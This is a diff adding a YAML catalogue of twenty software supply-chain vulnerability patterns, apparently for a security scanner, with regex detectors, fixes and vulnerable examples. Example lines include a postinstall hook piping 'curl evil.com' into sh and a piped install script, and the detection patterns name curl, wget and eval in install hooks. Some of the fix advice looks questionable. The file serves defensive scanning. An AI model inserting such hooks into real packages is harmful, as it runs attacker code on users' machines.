@@ -1,0 +1,219 @@
+metadata:
+  skill: security
+  domain: supply_chain
+  version: 6.2.1
+  updated: "2026-02-05"
+  migrated_from: supply-chain.yaml
+  patterns_count: 20
+  columns:
+    - id
+    - name
+    - severity
+    - category
+    - description
+    - detection_pattern
+    - fix_pattern
+    - slsa_level
+    - example_vuln
+    - example_fix
+patterns:
+  - id: SC-01
+    name: Dependency Confusion
+    severity: CRITICAL
+    category: Package
+    description: Private package names conflicting with public registries
+    detection_pattern: (npm publish|pip install|go get)(?!.*private)
+    fix_pattern: Use scoped names or private registry configuration
+    slsa_level: "2"
+    example_vuln: npm install @company/utils // Public npm checks first
+    example_fix: registry=https://registry.company.com\n@company:registry=https://private.company.com
+  - id: SC-02
+    name: Typosquatting Package
+    severity: CRITICAL
+    category: Package
+    description: Dependencies with similar names to popular packages
+    detection_pattern: (loadsh|reqeusts|djagno|expresss|reactt)
+    fix_pattern: Verify package names use lockfiles enable typosquatting checks
+    slsa_level: "1"
+    example_vuln: npm install lodahs // Typo of lodash
+    example_fix: npm install lodash // Correct\n# Use npm-audit or Snyk
+  - id: SC-03
+    name: Unpinned Dependencies
+    severity: HIGH
+    category: Version
+    description: Dependencies not pinned to specific versions
+    detection_pattern: (dependencies.*:\\s*['\]\\^|~|latest['\"])"
+    fix_pattern: Pin exact versions or use lockfiles verify checksums
+    slsa_level: "2"
+    example_vuln: '\lodash\": \"^4.0.0\" // Allows any 4.x"'
+    example_fix: '\lodash\": \"4.17.21\" // Exact version"'
+  - id: SC-04
+    name: Missing Lockfile
+    severity: HIGH
+    category: Build
+    description: No package lockfile to ensure reproducible builds
+    detection_pattern: package\\.json(?!.*lock)
+    fix_pattern: "Always commit lockfile: package-lock.json yarn.lock"
+    slsa_level: "2"
+    example_vuln: // No lockfile committed
+    example_fix: .gitignore should NOT contain:\n# package-lock.json
+  - id: SC-05
+    name: Unverified Downloads
+    severity: HIGH
+    category: Build
+    description: Build scripts download dependencies without verification
+    detection_pattern: (curl|wget|fetch).*\\|.*sh(?!.*verify|checksum)
+    fix_pattern: Verify checksums signatures before executing
+    slsa_level: "2"
+    example_vuln: curl https://install.sh | bash
+    example_fix: curl -O script.sh\nsha256sum -c script.sh.sha256\nbash script.sh
+  - id: SC-06
+    name: No SBOM Generation
+    severity: MEDIUM
+    category: Compliance
+    description: Software Bill of Materials not generated - EU CRA 2024
+    detection_pattern: (build|release)(?!.*sbom|cyclonedx|spdx)
+    fix_pattern: Generate SBOM in CycloneDX or SPDX format
+    slsa_level: "3"
+    example_vuln: // No SBOM in build pipeline
+    example_fix: npm run build\nnpx @cyclonedx/cyclonedx-npm --output sbom.json
+  - id: SC-07
+    name: SBOM Not Signed
+    severity: MEDIUM
+    category: Compliance
+    description: SBOM exists but not cryptographically signed
+    detection_pattern: (sbom|bom)(?!.*sign|gpg|sigstore)
+    fix_pattern: Sign SBOM with Sigstore or GPG for integrity
+    slsa_level: "3"
+    example_vuln: // Unsigned SBOM generated
+    example_fix: cosign sign-blob sbom.json --bundle sbom.bundle
+  - id: SC-08
+    name: No SLSA Build
+    severity: HIGH
+    category: Build
+    description: Build process does not meet SLSA L1 requirements
+    detection_pattern: (build|ci)(?!.*slsa|provenance)
+    fix_pattern: Implement SLSA provenance generation in CI
+    slsa_level: "2"
+    example_vuln: // No build provenance
+    example_fix: '# GitHub Actions with SLSA generator\nuses: slsa-framework/slsa-github-generator@v1'
+  - id: SC-09
+    name: Vulnerable Transitive Deps
+    severity: HIGH
+    category: Dependencies
+    description: Transitive dependencies with known vulnerabilities
+    detection_pattern: (node_modules|vendor).*CVE(?!.*patched)
+    fix_pattern: Audit transitive deps use tools like Snyk or Trivy
+    slsa_level: "2"
+    example_vuln: // npm audit shows high vulns
+    example_fix: npm audit fix --force\n# Or override in package.json
+  - id: SC-10
+    name: Compromised Maintainer
+    severity: HIGH
+    category: Trust
+    description: Dependencies from accounts with weak security
+    detection_pattern: (npm\\.pkg|pypi\\.org)(?!.*2fa|verified)
+    fix_pattern: Prefer packages from verified organizations orgs
+    slsa_level: "1"
+    example_vuln: // Install from unverified author
+    example_fix: // Use verified org packages\n// Check maintainer 2FA status
+  - id: SC-11
+    name: Build Script Injection
+    severity: CRITICAL
+    category: Build
+    description: User input used in build scripts without sanitization
+    detection_pattern: (npm run|make|script).*\\$\\{?\\w+
+    fix_pattern: Sanitize all inputs used in build scripts
+    slsa_level: "3"
+    example_vuln: npm run build --version=${USER_INPUT}
+    example_fix: const version = sanitize(process.env.VERSION)
+  - id: SC-12
+    name: Missing Code Review
+    severity: HIGH
+    category: Process
+    description: Commits merged without required code review
+    detection_pattern: (merge|push)(?!.*review|approve)
+    fix_pattern: Require code review for all changes enable branch protection
+    slsa_level: "3"
+    example_vuln: // Direct push to main allowed
+    example_fix: '# Branch protection:\nRequire pull request reviews: 2'
+  - id: SC-13
+    name: No Signed Commits
+    severity: MEDIUM
+    category: Process
+    description: Commits not cryptographically signed
+    detection_pattern: git commit(?!.*-S|gpg)
+    fix_pattern: Require signed commits for all contributors
+    slsa_level: "2"
+    example_vuln: git commit -m 'feature'
+    example_fix: 'git commit -S -m ''feature''\n# Configure: git config commit.gpgsign true'
+  - id: SC-14
+    name: Insecure CI Secrets
+    severity: CRITICAL
+    category: CI/CD
+    description: CI secrets exposed in logs or accessible to forks
+    detection_pattern: (echo.*\\$SECRET|print.*API_KEY|secrets.*fork)
+    fix_pattern: Use proper secret management mask from logs
+    slsa_level: "3"
+    example_vuln: "echo $API_KEY # Leaked in logs"
+    example_fix: '# Use GitHub secrets with mask\necho ''***'' instead of actual secret'
+  - id: SC-15
+    name: CI Supply Chain Attack
+    severity: CRITICAL
+    category: CI/CD
+    description: CI actions or plugins from untrusted sources
+    detection_pattern: uses:\\s*[^@]+@(?!v\\d|sha:|main)
+    fix_pattern: Pin CI actions to specific commits or versions
+    slsa_level: "3"
+    example_vuln: "uses: random-user/action@main"
+    example_fix: 'uses: actions/checkout@v4.1.0\n# Or pin to SHA:\nuses: actions/checkout@abc1234'
+  - id: SC-16
+    name: No Reproducible Builds
+    severity: MEDIUM
+    category: Build
+    description: Build output varies between identical inputs
+    detection_pattern: (build|compile)(?!.*reproducible|deterministic)
+    fix_pattern: Enable reproducible builds verify output hashes
+    slsa_level: "3"
+    example_vuln: // Non-deterministic builds
+    example_fix: '# Enable reproducible builds\nSOURCE_DATE_EPOCH=0 npm run build'
+  - id: SC-17
+    name: Package Integrity Missing
+    severity: HIGH
+    category: Registry
+    description: Package checksums not verified during install
+    detection_pattern: (npm install|pip install|go get)(?!.*integrity|checksum)
+    fix_pattern: Enable package integrity checking in package manager
+    slsa_level: "2"
+    example_vuln: npm install --ignore-scripts
+    example_fix: npm install --integrity\n# package-lock.json contains integrity hashes
+  - id: SC-18
+    name: Dependency Update Lag
+    severity: MEDIUM
+    category: Maintenance
+    description: Dependencies significantly behind latest versions
+    detection_pattern: (outdated|deprecated).*\\d+\\sversions
+    fix_pattern: Implement automated dependency updates with testing
+    slsa_level: "1"
+    example_vuln: // 50+ outdated packages
+    example_fix: '# Dependabot or Renovate config\nupdateNotScheduled: weekly'
+  - id: SC-19
+    name: No Provenance Attestation
+    severity: HIGH
+    category: Trust
+    description: Published packages lack SLSA provenance attestation
+    detection_pattern: (npm publish|cargo publish)(?!.*provenance|attest)
+    fix_pattern: Generate and publish provenance with releases
+    slsa_level: "3"
+    example_vuln: npm publish
+    example_fix: npm publish --provenance\n# Requires npm 9.5+ and GitHub Actions
+  - id: SC-20
+    name: Malicious Script Hooks
+    severity: CRITICAL
+    category: Package
+    description: Dangerous commands in package script hooks
+    detection_pattern: (preinstall|postinstall).*\\b(rm|curl|wget|eval)\\b
+    fix_pattern: Review all install scripts audit before installing
+    slsa_level: "2"
+    example_vuln: '\postinstall\": \"curl evil.com | sh\""'
+    example_fix: // Only use trusted packages\n// Review postinstall scripts
